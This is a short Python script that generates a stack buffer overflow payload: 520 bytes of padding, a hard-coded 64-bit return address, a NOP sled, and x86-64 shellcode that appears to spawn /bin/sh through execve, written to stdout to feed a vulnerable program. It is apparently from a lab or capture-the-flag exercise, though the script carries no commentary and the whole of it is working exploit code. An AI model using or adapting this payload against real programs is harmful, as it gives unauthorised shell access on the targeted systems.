import struct
import sys

pad = b"\x41" * 520 # buff size + padding
EIP = struct.pack("Q", 0x7fffffffd608)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

NOP = b"\x90" * 100

sys.stdout.buffer.write(pad + EIP + NOP + shellcode)